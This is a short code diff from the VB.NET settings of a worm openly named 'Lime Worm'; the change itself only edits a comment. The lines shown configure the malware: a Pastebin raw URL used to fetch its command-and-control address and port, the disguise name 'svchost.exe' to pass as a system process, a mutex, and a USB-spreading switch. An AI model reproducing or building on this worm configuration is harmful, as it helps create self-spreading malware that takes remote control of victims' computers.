@@ -6,7 +6,7 @@
     Public Shared Pastebin As String = "https://pastebin.com/raw/DDTVwwbu" ' IP:PORT
     Public Shared HOST As String 'IP
     Public Shared PORT As Integer 'PORT
-    Public Shared EXE As String = "svchost.exe" 'worm name on builder form
+    Public Shared EXE As String = "svchost.exe" 'worm name
     Public Shared NMT As Threading.Mutex = Nothing
     Public Shared MTX As String = "_Lime_Worm_" 'mutex
     Public Shared USB As Boolean = False 'usb spread
